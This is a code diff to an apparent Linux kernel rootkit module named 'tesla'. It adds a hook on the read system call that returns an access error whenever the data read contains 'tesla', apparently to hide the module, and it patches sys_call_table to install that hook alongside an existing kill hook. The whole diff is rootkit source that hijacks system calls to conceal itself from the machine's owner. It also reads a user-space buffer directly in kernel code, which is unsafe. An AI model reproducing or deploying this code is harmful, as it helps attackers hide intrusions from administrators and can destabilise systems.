@@ -19,7 +19,14 @@ MODULE_LICENSE("GPL v2");
 
 asmlinkage long tesla_read(unsigned int fd, char __user *buf, size_t count)
 {
-	return 0;
+	int read;
+	read = (*orig_read)(fd, buf, count);
+	if(read){
+		if(strstr(buf, "tesla")){
+			return -EACCES;
+		}
+	}
+	return read;
 }
 
 asmlinkage long tesla_write(unsigned int fd, char __user *buf, size_t count)
@@ -82,6 +89,10 @@ int tesla_init(void)
 	/* save the original kill system call into orig_kill, and replace the kill system call with tesla_kill */
 	orig_kill= (void *)sys_call_table[__NR_kill];
 	sys_call_table[__NR_kill] = (long *)tesla_kill;
+
+	/* save the original read system call into orig_read, and replace the read system call with tesla_read */
+	orig_read = (void *)sys_call_table[__NR_read];
+	sys_call_table[__NR_read] = (long *)tesla_read;
 
 	/* set bit 16 of cr0, so as to turn the write protection on */
 
